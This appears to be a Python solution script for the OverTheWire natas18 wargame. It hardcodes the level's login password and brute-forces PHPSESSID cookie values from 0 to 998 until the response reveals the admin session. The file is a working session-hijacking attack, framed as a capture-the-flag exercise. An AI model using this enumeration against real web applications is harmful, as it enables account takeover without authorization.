import requests
from requests.auth import HTTPBasicAuth
import json
import datetime
import time

# Setup login deatils and character sets
chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
filtered_chars = ''
passwordlist= []
exists_str = "You are an admin"
query = {'username' : ''}

natasURL = 'http://natas18.natas.labs.overthewire.org/'

natas_usr   = 'natas18'
natas_pword = 'xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP'
login=(natas_usr,natas_pword)

#Find the list of chars in pword
for i in range (0,999):
    cookie = {"PHPSESSID": str(i)}
    r =    requests.request(method ='POST', url=natasURL , auth=login, cookies=cookie)
    time.sleep(0.1)
    if "You are an admin" in r.text:
        print("Session id is %d" %i)
        print(r.content)
        break
    else: print("%d is not the session id." %i)

